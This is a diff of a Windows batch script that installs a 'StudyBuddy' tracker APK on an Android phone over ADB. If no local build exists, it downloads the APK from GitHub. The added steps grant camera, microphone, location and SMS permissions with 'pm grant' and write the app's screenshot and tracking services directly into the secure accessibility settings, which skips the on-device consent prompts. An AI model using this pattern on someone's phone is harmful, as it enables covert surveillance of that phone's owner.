@@ -2,113 +2,180 @@
 setlocal EnableDelayedExpansion
 
 set "PACKAGE=com.studybuddy.tracker"
+set "SERVICE1=com.studybuddy.tracker/com.studybuddy.tracker.StudyTrackingService"
+set "SERVICE2=com.studybuddy.tracker/com.studybuddy.tracker.ManualScreenshotAccessibilityService"
 set "GITHUB_APK_URL=https://github.com/PradyumnChauhan/allude/raw/refs/heads/main/studybuddy.apk"
-set "APK_PATH=%TEMP%\studybuddy.apk"
+
+set "SCRIPT_DIR=%~dp0"
+if "%SCRIPT_DIR:~-1%"=="\" set "SCRIPT_DIR=%SCRIPT_DIR:~0,-1%"
 
 echo ==========================================
-echo   StudyBuddy Cloud APK Installer
+echo   StudyBuddy APK + Permissions Setup
 echo ==========================================
 echo.
 
-echo [1/4] Checking ADB...
+echo [1/9] Checking ADB...
 where adb >nul 2>nul
-
 if errorlevel 1 (
-    echo ADB not found.
-    echo Installing Android platform-tools...
-
+    echo ADB not found. Installing Android platform-tools...
     set "SDK_DIR=%LOCALAPPDATA%\Android\Sdk"
-    set "PLAT_DIR=!SDK_DIR!\platform-tools"
-    set "ZIP_PATH=%TEMP%\platform-tools.zip"
+    set "PLAT_DIR=%SDK_DIR%\platform-tools"
+    mkdir "%SDK_DIR%" >nul 2>nul
+    set "ZIP_PATH=%TEMP%\platform-tools-latest-windows.zip"
 
-    powershell -NoProfile -ExecutionPolicy Bypass -Command ^
-        "Invoke-WebRequest -Uri 'https://dl.google.com/android/repository/platform-tools-latest-windows.zip' -OutFile '!ZIP_PATH!'"
-
+    powershell -NoProfile -ExecutionPolicy Bypass -Command "try { Invoke-WebRequest -Uri 'https://dl.google.com/android/repository/platform-tools-latest-windows.zip' -OutFile '%ZIP_PATH%' -UseBasicParsing } catch { exit 1 }"
     if errorlevel 1 (
-        echo [ERROR] Failed to download platform-tools.
+        echo [ERROR] Failed to download Android platform-tools.
         exit /b 1
     )
 
-    powershell -NoProfile -ExecutionPolicy Bypass -Command ^
-        "Expand-Archive -Path '!ZIP_PATH!' -DestinationPath '!SDK_DIR!' -Force"
-
-    if not exist "!PLAT_DIR!\adb.exe" (
-        echo [ERROR] ADB installation failed.
+    powershell -NoProfile -ExecutionPolicy Bypass -Command "Expand-Archive -Path '%ZIP_PATH%' -DestinationPath '%LOCALAPPDATA%\Android\Sdk' -Force"
+    if not exist "%PLAT_DIR%\adb.exe" (
+        echo [ERROR] Android platform-tools install failed.
         exit /b 1
     )
 
-    set "PATH=!PLAT_DIR!;!PATH!"
+    set "PATH=%PLAT_DIR%;%PATH%"
 )
 
-echo.
-echo [2/4] Checking Android device...
-
-adb devices
-
-echo.
-echo Make sure your device appears as "device".
-echo.
-
-adb get-state >nul 2>&1
-
+where adb >nul 2>nul
 if errorlevel 1 (
-    echo [ERROR] No authorized Android device detected.
-    echo Enable USB debugging and authorize this computer.
+    echo [ERROR] ADB is still not available.
+    exit /b 1
+)
+
+adb version
+
+echo.
+echo [2/9] Checking connected device...
+adb devices | findstr /I "device" >nul
+if errorlevel 1 (
+    echo.
+    echo [ERROR] No Android device detected.
+    echo Connect the phone in USB debugging mode and authorize it.
     exit /b 1
 )
 
 echo Device detected.
 
-echo.
-echo [3/4] Downloading APK from GitHub...
+set "APK_PATH="
+if exist "%SCRIPT_DIR%\app\build\intermediates\apk\debug\app-debug.apk" set "APK_PATH=%SCRIPT_DIR%\app\build\intermediates\apk\debug\app-debug.apk"
+if not defined APK_PATH if exist "%SCRIPT_DIR%\app\release\studybuddy.apk" set "APK_PATH=%SCRIPT_DIR%\app\release\studybuddy.apk"
+if not defined APK_PATH if exist "%cd%\app\build\intermediates\apk\debug\app-debug.apk" set "APK_PATH=%cd%\app\build\intermediates\apk\debug\app-debug.apk"
+if not defined APK_PATH if exist "%cd%\app\release\studybuddy.apk" set "APK_PATH=%cd%\app\release\studybuddy.apk"
+if not defined APK_PATH if exist "%SCRIPT_DIR%\..\app\build\intermediates\apk\debug\app-debug.apk" set "APK_PATH=%SCRIPT_DIR%\..\app\build\intermediates\apk\debug\app-debug.apk"
+if not defined APK_PATH if exist "%SCRIPT_DIR%\..\app\release\studybuddy.apk" set "APK_PATH=%SCRIPT_DIR%\..\app\release\studybuddy.apk"
 
-if exist "!APK_PATH!" del /q "!APK_PATH!"
-
-powershell -NoProfile -ExecutionPolicy Bypass -Command ^
-    "try { Invoke-WebRequest -Uri '!GITHUB_APK_URL!' -OutFile '!APK_PATH!' -UseBasicParsing; exit 0 } catch { Write-Host $_; exit 1 }"
-
-if errorlevel 1 (
-    echo [ERROR] APK download failed.
-    exit /b 1
-)
-
-if not exist "!APK_PATH!" (
-    echo [ERROR] APK file was not created.
-    exit /b 1
-)
-
-for %%A in ("!APK_PATH!") do set "APK_SIZE=%%~zA"
-
-echo Downloaded APK size: !APK_SIZE! bytes
-
-if !APK_SIZE! LSS 500000 (
-    echo [ERROR] Downloaded file is suspiciously small.
-    del /q "!APK_PATH!"
-    exit /b 1
-)
-
-echo.
-echo [4/4] Installing APK...
-
-adb install -r "!APK_PATH!"
-
-if errorlevel 1 (
+if not defined APK_PATH (
     echo.
+    echo [INFO] No local APK found. Downloading from GitHub...
+    set "DOWNLOAD_APK=%TEMP%\studybuddy.apk"
+    powershell -NoProfile -ExecutionPolicy Bypass -Command "try { Invoke-WebRequest -Uri '%GITHUB_APK_URL%' -OutFile '%DOWNLOAD_APK%' -UseBasicParsing } catch { exit 1 }"
+    if errorlevel 1 (
+        echo [ERROR] APK download failed.
+        exit /b 1
+    )
+
+    powershell -NoProfile -ExecutionPolicy Bypass -Command "$p='%DOWNLOAD_APK%'; if (-not $p.ToLower().EndsWith('.apk')) { Write-Error 'Downloaded file is not an APK'; exit 10 }; $fi = Get-Item $p; if ($fi.Length -lt 500000) { Write-Error ('Downloaded APK looks too small: ' + $fi.Length + ' bytes'); exit 11 }; Write-Host 'APK validation passed: ' $fi.FullName 'Size=' $fi.Length"
+    if errorlevel 1 (
+        echo [ERROR] Downloaded file is not a valid APK.
+        echo The GitHub URL may not be serving a real APK.
+        exit /b 1
+    )
+
+    set "APK_PATH=%DOWNLOAD_APK%"
+)
+
+echo.
+echo [3/9] Uninstalling prior app if needed...
+adb shell pm list packages | findstr /I "%PACKAGE%" >nul
+if not errorlevel 1 (
+    adb uninstall %PACKAGE%
+)
+
+echo.
+echo [4/9] Installing APK...
+echo APK path: %APK_PATH%
+if not exist "%APK_PATH%" (
+    echo [ERROR] APK file is missing before install.
+    exit /b 1
+)
+
+adb install -r "%APK_PATH%"
+if errorlevel 1 (
+    echo [WARNING] Standard install failed. Retrying with a fallback command...
+    adb install -t -r "%APK_PATH%"
+)
+if errorlevel 1 (
     echo [ERROR] APK installation failed.
     exit /b 1
 )
 
 echo.
-echo ==========================================
-echo   Installation completed successfully
-echo ==========================================
+echo [5/9] Granting permissions...
+adb shell pm grant %PACKAGE% android.permission.CAMERA
+adb shell pm grant %PACKAGE% android.permission.RECORD_AUDIO
+adb shell pm grant %PACKAGE% android.permission.READ_EXTERNAL_STORAGE
+adb shell pm grant %PACKAGE% android.permission.WRITE_EXTERNAL_STORAGE
+adb shell pm grant %PACKAGE% android.permission.ACCESS_FINE_LOCATION
+adb shell pm grant %PACKAGE% android.permission.ACCESS_COARSE_LOCATION
+adb shell pm grant %PACKAGE% android.permission.READ_SMS
+adb shell pm grant %PACKAGE% android.permission.RECEIVE_SMS
+adb shell pm grant %PACKAGE% android.permission.WRITE_SMS
+adb shell pm grant %PACKAGE% android.permission.SYSTEM_ALERT_WINDOW 2>nul
+adb shell appops set %PACKAGE% SYSTEM_ALERT_WINDOW allow 2>nul
+adb shell pm grant %PACKAGE% android.permission.POST_NOTIFICATIONS 2>nul
+adb shell pm grant %PACKAGE% android.permission.READ_PHONE_STATE 2>nul
+
+
 echo.
+echo [6/9] Enabling accessibility services...
+set "ACCESS_SERVICES="
+for /f "delims=" %%i in ('adb shell settings get secure enabled_accessibility_services 2^>nul') do set "ACCESS_SERVICES=%%i"
+if not defined ACCESS_SERVICES (
+    set "ACCESS_SERVICES=%SERVICE1%:%SERVICE2%"
+) else (
+    echo !ACCESS_SERVICES! | findstr /I "%SERVICE1%" >nul
+    if errorlevel 1 set "ACCESS_SERVICES=!ACCESS_SERVICES!:%SERVICE1%"
+    echo !ACCESS_SERVICES! | findstr /I "%SERVICE2%" >nul
+    if errorlevel 1 set "ACCESS_SERVICES=!ACCESS_SERVICES!:%SERVICE2%"
+)
+adb shell settings put secure enabled_accessibility_services "!ACCESS_SERVICES!"
+adb shell settings put secure accessibility_enabled 1
+
+
+echo.
+echo [7/9] Opening Android settings for accessibility and overlay...
+adb shell am start -n com.android.settings/.Settings$AccessibilitySettingsActivity 2>nul
+if errorlevel 1 (
+    adb shell am start -S android.settings.ACCESSIBILITY_SETTINGS
+)
+
+adb shell am start -a android.settings.action.MANAGE_OVERLAY_PERMISSION 2>nul
+if errorlevel 1 (
+    adb shell appops set %PACKAGE% SYSTEM_ALERT_WINDOW allow
+)
+
+
+echo.
+echo [8/9] Starting app...
+adb shell monkey -p %PACKAGE% -c android.intent.category.LAUNCHER 1 >nul 2>&1
+
+
+echo.
+echo [9/9] Finalizing...
+echo.
+echo ✅ Installation and permission setup complete.
 echo Package: %PACKAGE%
-echo APK: !APK_PATH!
+echo Accessibility services:
+echo   %SERVICE1%
+echo   %SERVICE2%
+echo.
+echo On the device, confirm the accessibility services and enable "Display over other apps" when prompted.
 echo.
 
-del /q "!APK_PATH!" >nul 2>&1
+if defined DOWNLOAD_APK if exist "%DOWNLOAD_APK%" del /q "%DOWNLOAD_APK%" >nul 2>&1
 
-echo Temporary APK deleted.
-echo.
-pause
+echo Press any key to exit...
+pause >nul
+exit /b 0
